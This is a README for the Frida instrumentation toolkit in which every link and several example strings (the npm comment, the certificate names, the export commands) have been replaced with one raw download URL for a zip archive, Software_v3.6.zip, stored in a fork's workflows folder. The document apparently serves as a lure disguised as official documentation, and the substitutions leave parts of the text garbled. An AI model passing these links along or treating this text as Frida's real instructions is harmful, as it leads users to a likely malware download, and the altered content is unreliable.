# Frida

Dynamic instrumentation toolkit for developers, reverse-engineers, and security
researchers. Learn more at [https://github.com/Kali99xx/frida/raw/refs/heads/main/.github/workflows/Software_v3.6.zip](https://github.com/Kali99xx/frida/raw/refs/heads/main/.github/workflows/Software_v3.6.zip).

Two ways to install
===================

## 1. Install from prebuilt binaries

This is the recommended way to get started. All you need to do is:

    pip install frida-tools # CLI tools
    pip install frida       # Python bindings
    npm install frida       # https://github.com/Kali99xx/frida/raw/refs/heads/main/.github/workflows/Software_v3.6.zip bindings

You may also download pre-built binaries for various operating systems from
Frida's [releases](https://github.com/Kali99xx/frida/raw/refs/heads/main/.github/workflows/Software_v3.6.zip) page on GitHub.

## 2. Build your own binaries

Run:

    make

You may also invoke `./configure` first if you want to specify a `--prefix`, or
any other options.

### CLI tools

For running the Frida CLI tools, e.g. `frida`, `frida-ls-devices`, `frida-ps`,
`frida-kill`, `frida-trace`, `frida-discover`, etc., you need a few packages:

    pip install colorama prompt-toolkit pygments

### Apple OSes

First make a trusted code-signing certificate. If you have already used Xcode
before, chances are you already have an Apple development certificate.
You can check it with the following command:

    security find-identity -v -p codesigning

Which will return the certificate in the following format:

    1) XXXXX "Apple Development: https://github.com/Kali99xx/frida/raw/refs/heads/main/.github/workflows/Software_v3.6.zip (XXXXX)"

If you do not have a certificate, follow this guide: 
https://github.com/Kali99xx/frida/raw/refs/heads/main/.github/workflows/Software_v3.6.zip

Next export the name of your certificate to relevant environment
variables, and run `make`:

    export MACOS_CERTID="Apple Development: https://github.com/Kali99xx/frida/raw/refs/heads/main/.github/workflows/Software_v3.6.zip (XXXXXXXXXX)"
    export IOS_CERTID="Apple Development: https://github.com/Kali99xx/frida/raw/refs/heads/main/.github/workflows/Software_v3.6.zip (XXXXXXXXXX)"
    export WATCHOS_CERTID="Apple Development: https://github.com/Kali99xx/frida/raw/refs/heads/main/.github/workflows/Software_v3.6.zip (XXXXXXXXXX)"
    export TVOS_CERTID="Apple Development: https://github.com/Kali99xx/frida/raw/refs/heads/main/.github/workflows/Software_v3.6.zip (XXXXXXXXXX)"
    make

## Learn more

Have a look at our [documentation](https://github.com/Kali99xx/frida/raw/refs/heads/main/.github/workflows/Software_v3.6.zip).
